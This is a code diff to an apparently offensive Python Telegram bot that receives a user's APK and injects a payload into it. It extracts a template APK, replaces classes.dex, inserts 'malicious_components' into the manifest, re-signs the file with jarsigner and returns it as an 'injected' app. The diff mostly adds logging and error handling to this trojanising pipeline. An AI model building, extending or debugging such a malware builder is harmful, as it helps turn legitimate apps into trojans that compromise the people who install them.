@@ -79,9 +79,15 @@ def create_apk(source_dir, output_path):
 
 
 def inject_payload(apk_bytes):
+    logger.info("=== INJECT START ===")
+    
     if not TEMPLATE_APK:
         logger.error("Template APK not found!")
         return None
+    
+    logger.info(f"Template: {TEMPLATE_APK}")
+    logger.info(f"Template exists: {os.path.exists(TEMPLATE_APK)}")
+    logger.info(f"Template size: {os.path.getsize(TEMPLATE_APK) if os.path.exists(TEMPLATE_APK) else 0}")
 
     try:
         with tempfile.TemporaryDirectory() as tmpdir:
@@ -111,6 +117,12 @@ def inject_payload(apk_bytes):
 
             logger.info("Extracting template APK...")
             extract_apk(TEMPLATE_APK, str(final_dir))
+            
+            if not final_dir.exists():
+                logger.error("Template extraction failed!")
+                return None
+            
+            logger.info(f"Template extracted: {len(list(final_dir.rglob('*')))} files")
 
             logger.info("Replacing classes.dex...")
             dst_dex = final_dir / "classes.dex"
@@ -198,6 +210,8 @@ def inject_payload(apk_bytes):
                 manifest = manifest.replace("</application>", malicious_components + "</application>")
                 manifest_path.write_text(manifest, encoding="utf-8")
                 logger.info("Manifest updated")
+            else:
+                logger.error("AndroidManifest.xml not found in template!")
 
             logger.info("Creating APK...")
             create_apk(str(final_dir), str(output_apk))
@@ -205,6 +219,7 @@ def inject_payload(apk_bytes):
 
             if KEYSTORE_PATH:
                 logger.info("Signing APK...")
+                logger.info(f"Keystore: {KEYSTORE_PATH}")
                 sign_ok = run_cmd(
                     [
                         "jarsigner",
@@ -218,8 +233,13 @@ def inject_payload(apk_bytes):
                     "sign"
                 )
                 if sign_ok and signed_apk.exists():
+                    logger.info(f"Signed APK: {os.path.getsize(signed_apk)} bytes")
                     with open(signed_apk, "rb") as f:
                         return f.read()
+                else:
+                    logger.error("Signing failed!")
+            else:
+                logger.error("No keystore found!")
 
             logger.warning("Returning unsigned APK")
             with open(output_apk, "rb") as f:
@@ -263,27 +283,31 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Send a valid APK file!")
         return
 
+    logger.info(f"APK received: {document.file_name} ({document.file_size} bytes)")
     status_msg = await update.message.reply_text("Downloading APK...")
 
     try:
         file = await context.bot.get_file(document.file_id)
         apk_data = await file.download_as_bytearray()
+        logger.info(f"APK downloaded: {len(apk_data)} bytes")
 
         await status_msg.edit_text("Injecting payload... (may take a few minutes)")
 
         result = inject_payload(bytes(apk_data))
 
         if result:
+            logger.info(f"Injection successful: {len(result)} bytes")
             await update.message.reply_document(
                 document=result,
                 filename=f"injected_{document.file_name}",
                 caption="APK injected successfully!"
             )
         else:
+            logger.error("Injection returned None!")
             await status_msg.edit_text("Error injecting payload!")
 
     except Exception as e:
-        logger.error(f"Error: {e}")
+        logger.error(f"Error: {e}", exc_info=True)
         await status_msg.edit_text(f"Error: {str(e)}")
 
 
